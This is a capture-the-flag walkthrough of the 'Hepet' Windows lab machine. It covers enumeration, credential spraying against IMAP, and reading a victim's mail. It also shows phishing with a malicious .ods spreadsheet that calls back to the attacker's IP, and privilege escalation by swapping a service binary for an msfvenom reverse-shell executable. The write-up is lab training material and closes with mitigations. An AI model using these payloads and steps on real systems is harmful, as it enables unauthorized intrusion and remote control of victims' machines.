## Introduction

In this walkthrough, I worked on the **Hepet** intermediate Windows machine from PG Practice. While browsing the target’s website, I found a **user password exposed in the team section’s description field**. I reused this password to authenticate and access the user's **email account**. From there, I crafted a **malicious `.ods` spreadsheet** and sent it to the target user, which resulted in remote code execution and gave me a shell on the machine. Further enumeration revealed a **vulnerable application** installed on the system. I exploited this application to escalate privileges and obtained a shell as `NT AUTHORITY\SYSTEM`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 25 (SMTP)

![image.png](image%202.png)

It probably allows for sending emails, and it is open relay.

### Port 79 (finger)

**Displays information about users on a specified remote computer (typically a computer running UNIX) that is running the finger service or daemon. As you can see from Nmap scan it found `Maiser` account.**

I tried executing commands but it failed:

```bash
finger "|/bin/id@$IP”
```

![image.png](image%203.png)

```bash
finger @$IP
```

### Port 106 (poppass)

(TCP) poppassd (aka. epass) allows passwords to be changed on POP servers. Traditionally, users would have to have shell (Telnet) accounts on the servers in order to change their passwords. This allows users with just POP access to change their passwords

### Port 110 (pop3)

I used logging in using `Maiser:Maiser` but it didn’t work.

![image.png](image%208.png)

### Port 135 (msrpc)

```bash
rpcclient -U'%' $IP
```

**NT_STATUS_ACCESS_DENIED**

### Port 139/445 (SMB)

```bash
smbclient -L //$IP/ -N
```

**NT_STATUS_ACCESS_DENIED**

### Port 143 (IMAP)

Current version is not vulnerable to exploits.

### Port 20001 (ftp)

### Port 11100 (vnc)

Version - Protocol version: 3.8

### Port 33006 (mysql)

## Web

### Port 443

Version - Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)

### Port 2224

### Port 8000

Version - Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)

Both websites seems the same, I found team members, and user `Jonas.K` role is a bit weird, it looks like a password, I am gonna try it out.

Users

```bash
Maiser
Admin
Charlotte D.
Magnus U.
Agnes T.
Jonas K.
Martha U.
Ela Arwel

Pass:
SicMundusCreatusEst
```

I made a user list, and ran `username-anarchy` on them, to find all possible username variations.

```bash
/opt/brute-force/username-anarchy/username-anarchy -f first,first.last,last,flast,f.last -i users > usernames
```

```bash
sudo nxc smb $IP -u usernames -p SicMundusCreatusEst --continue-on-success
```

![image.png](image%209.png)

It doesn’t work, maybe we don’t know correct format of usernames.

```bash
gobuster dir -u http://$IP:8000/ -w /usr/share/wordlists/dirb/common.txt -t 30  -b 404,403,400
```

![image.png](image%2010.png)

Checking `imap` I found a match:

```bash
hydra -L usernames -p 'SicMundusCreatusEst' imap://$IP
```

![image.png](image%2011.png)

Let’s connect to POP3, you can do the same with `imap` too.

```bash
telnet $IP 110
user jonas
pass SicMundusCreatusEst
list
retr 1 #first email
```

![image.png](image%2012.png)

I see that it was sent using `sendemail`. We see email was sent from `agnes` to `mailadmin` and other members. We see that `agnes` asks for someone to send `spreadsheet` as the target is Windows I will assume they are talking about MS Office Suite.

Let’s quickly see other messages too:

![image.png](image%2013.png)

You see in the third message they say we will change suite to `LibreOffice`.

Let’s make malicious `.ods` file and send it to `mailadmin`. I am gonna use [MMG-LO](https://github.com/0bfxgh0st/MMG-LO) for creating malicious `.ods` file.

```bash
sudo python3 /opt/MMG-LO/mmg-ods.py windows 192.168.45.159 443
```

![image.png](image%2014.png)

Now let’s send an email using `sendemail` as they did:

```bash
sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.237.140:25 -u 'spreadsheet' -m 'spreadsheet you requested' -a file.ods
```

After waiting for about 3-4 minutes I got a connection back:

## Shell as ela arwel

I see non-default `Veyon` app directory in my home directory. Let’s check installed apps:

```bash
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

![image.png](image%2017.png)

```bash
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

![image.png](image%2018.png)

I found the [Unquoted Service Path](https://www.exploit-db.com/exploits/49925) exploit for this application. As `Veyon` app’s directory in our home directory that means we can write there.

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

![image.png](image%2019.png)

Let’s check our permissions:

```powershell
sc.exe sdshow VeyonService
```

![image.png](image%2020.png)

I am gonna use [SDDL Parser](https://github.com/zacateras/sddl-parser)

You can also use this [website](https://thesddlmaker.streamlit.app/.)

```bash
sudo python3 /opt/winsddl/sd.py --type=service "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
```

![image.png](image%2021.png)

I used this method because `.\accesschk.exe` doesn’t always work. I don’t see we have start, stop permissions over the service. Also  we can see that it is started automatically from here:

![image.png](image%2022.png)

I am gonna put exploit called `Ela` in Users directory, but we don’t have permission to do that.

```powershell
icacls c:\users
```

![image.png](image%2023.png)

I checked permissions of `Veyon` directory and see that our user has full permissions:

![image.png](image%2024.png)

I am gonna change `veyon-service.exe` to malicious one.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.159 LPORT=4445 -f exe -o veyon-service.exe
```

As it set to `AUTO-START` and we have `SeShutdownPrivilege` privilege I am gonna try restart the machine:

```powershell
shutdown /r /t 0
```

## Mitigation

- Avoid exposing **credentials in public-facing content** such as team pages or metadata.
- Implement **multi-factor authentication (MFA)** to reduce the risk of single-password compromises.
- Disable or sandbox **macro execution and external scripting in office documents** by default.
- Keep all **installed applications up to date** and apply relevant security patches.
- Monitor email and system activity for **unusual behavior**, such as unexpected document execution.
